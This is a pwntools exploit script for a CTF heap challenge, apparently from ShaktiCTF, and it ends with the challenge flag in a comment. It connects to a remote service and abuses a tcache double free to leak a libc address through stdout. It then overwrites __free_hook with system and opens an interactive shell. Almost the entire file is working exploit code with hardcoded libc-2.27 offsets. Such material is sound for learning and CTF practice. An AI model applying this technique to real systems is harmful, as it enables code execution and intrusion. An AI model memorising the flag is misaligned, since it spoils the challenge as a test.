#!/usr/bin/python3

from pwn import *

filename = "./chall"

#io = process(filename)
io = remote("34.121.211.139", 4444)
elf = ELF(filename)
libc = ELF("./libc-2.27.so")

def menu():
        for _ in range(5):
                io.recvline()

def view():
        menu()
        io.sendline(str(2))

def add(size, data: bytes):
        menu()
        io.sendline("1")
        io.sendline(str(size))
        io.sendline(data)

def delete():
        menu()
        io.recvline()
        io.sendline("3")

def main():
        add(8, "A"*8)
        #Tcache Double Free to control fd
        delete()
        delete()
        print("Tcache now: [chunk1->chunk1]")

        add(8, p64(0x601050))
        add(8, "AAA")
        add(8, p64(elf.sym.stdout))
        view()
        io.recvuntil("inside\n")
        leaked_address = u64(io.recvline().decode("latin-1").strip().ljust(8, "\x00"))
        base_address = leaked_address - 0x3ec760

        log.info("Leaked Address: %s " % hex(leaked_address))
        log.info("Base address: %s " % hex(base_address))

        system = base_address + 0x4f4e0
        freehook = base_address + 0x3ed8e8

        add(0x40, "A"*8)
        delete()
        delete()


        # Overweite the address of _free_hook with the address of system
        add(0x40, p64(freehook))
        add(0x40, "A"*8)
        add(0x40, p64(system))


        log.info("Allocate a chunk of data /bin/sh and free it to get a shell")
        io.interactive()

if __name__ == "__main__":
        main()

# shaktictf{u_4re_a_trU3_c0mr4de}
